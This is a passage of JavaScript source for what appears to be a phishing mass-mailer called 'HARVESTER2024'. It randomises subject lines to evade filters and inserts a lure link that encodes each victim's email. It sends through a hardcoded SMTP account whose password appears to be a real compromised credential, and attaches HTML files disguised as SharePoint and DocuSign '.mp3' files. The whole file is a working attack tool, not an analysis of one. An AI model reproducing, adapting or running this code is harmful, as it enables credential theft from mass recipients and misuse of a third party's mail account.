        subject = subject.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        subject = subject.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        subject = subject.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        subject = subject.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        subject = subject.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        subject = subject.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        subject = subject.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        subject = subject.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        subject = subject.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        subject = subject.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        subject = subject.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        subject = subject.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        subject = subject.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        subject = subject.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        subject = subject.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        subject = subject.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        subject = subject.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        subject = subject.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        subject = subject.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        subject = subject.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        subject = subject.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        subject = subject.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        subject = subject.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        return Promise.resolve(subject);
    } catch(err) {
        return Promise.reject(err);
    }
}

const randomLinks = () => {
    /**
     * For randomLinks, Use "RANDOMLINK" for command in your html letter href, you need atleast 2 links url for random.
     * The example like this
     * [
     * 'https://example.com/?e=BASE64EMAIL=XXXEMAIL',
     * 'https://example2.com/?e=BASE64EMAIL=XXXEMAIL',
     * 'https://example3.com/?e=BASE64EMAIL=XXXEMAIL',
     * 'https://example4.com/?e=BASE64EMAIL=XXXEMAIL',
     * ]
     * Put after const link = [
     * And the ] symbol dont be delete for safety
     */
    const link = [
     'https://pub-cd65f0418f8946b996164a9a56c30028.r2.dev/link.html',
     '',
     '',
    ]
    const random = link[Math.floor(Math.random() * link.length)]
    return random
}

async function checkSMTP(smtpConfig) {
    return nodemailer.createTransport({
        host: smtpConfig.host,
        port: smtpConfig.port,
        secure: smtpConfig.secure,
        auth: {
            user: smtpConfig.user,
            pass: smtpConfig.pass
        }
    });
}


(async function () {
    console.log(chalk`
{bold.red HARVESTER2024}
{bold.red Code by SYNSZN} 
    `);
    if (process.argv[2] == undefined) {
        console.log('Usage : node synszn.js list.txt');
        process.exit(1);
    }
    let smtpConfig = {
        // SMTP DETAILS HERE
        host: 'smtp.ionos.de', // SMTP SERVER
        port: '587', // SMTP PORT
        secure: false, // <== if port 25 or 587, false. if port 465 = true
        user: 'info@rooftechnology.co.uk', // <== SMTP USER
        pass: '3BeenhamRg75pp!' // <== SMTP PASSWORD
    };
    let base_href = 'THIS IS WHERE YOU INPUT THE URL YOU WANT TO CONVERT TO BASE64'; // <== BASEURL
    const transporter = await checkSMTP(smtpConfig);
    console.log(chalk`{bold.red Your SMTP is the Shit!, Fuck it Up!}\n`);
    console.log(chalk`{bold.red Open list file, ${process.argv[2]}.}`);
    let mailist = await fs.readFileSync(process.argv[2], 'utf-8');
    let emailist = mailist.split(/\r?\n/);
    console.log(chalk`{bold.red [!] Found ${emailist.length} line.}\n`);
    emailist = _.chunk(emailist, 20);
    let count = 1;
    for (let i = 0; i < emailist.length; i++) {
        for (let email of emailist[i]) {
            let randomlinks = randomLinks();
            if (email.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
                const doL = await readLetter('letter.html', email, "America/Los_Angeles", base_href, randomlinks); // DONT TAMPER ONLY IF YOU UNDERSTAND IT.
                const doF = await readFrom('<info@rooftechnology.co.uk>', email); // <== SENDER DETAILS HERE e.g .. Office365 <info@office.com>
                const doS = await readSubject('', email, "America/Los_Angeles"); // <== SUBJECT HERE e.g .. Important Notification
                try {
                    let mailConfig = {
                        from: doF,
                        html: doL,
                        subject: doS,
                        to: email,
                        attachments: [{
                                filename: 'sharepoint.mp3',
                                path: __dirname + '/NDA.html',
                                encoding: 'base64',
                                contentDisposition: 'inline',
                            },
                            {
                                filename: 'Docusign.mp3',
                                path: __dirname + '/Docusign.html',
                                encoding: 'base64',
                                contentDisposition: 'inline',
                            }
                        ],

                        priority: 'normal', // <== PRIORITY, low, normal, high or you can delete this if you don't need it.                 
                    };
                    await transporter.sendMail(mailConfig);
                    console.log(chalk`{bold.green ${email} => SUCCESS} | ==> {bold.red ${count++}}`);
                } catch (err) {
                    console.log(chalk`{bold.red ${email} => ERROR : ${err.message}}`);
                    await fs.appendFileSync('logs-failed.txt', email + ' => ' + err.message + '\n');
                }
            }
            
            await new Promise(resolve => setTimeout(resolve, 7000));// sender delay here
        }
    }
})();
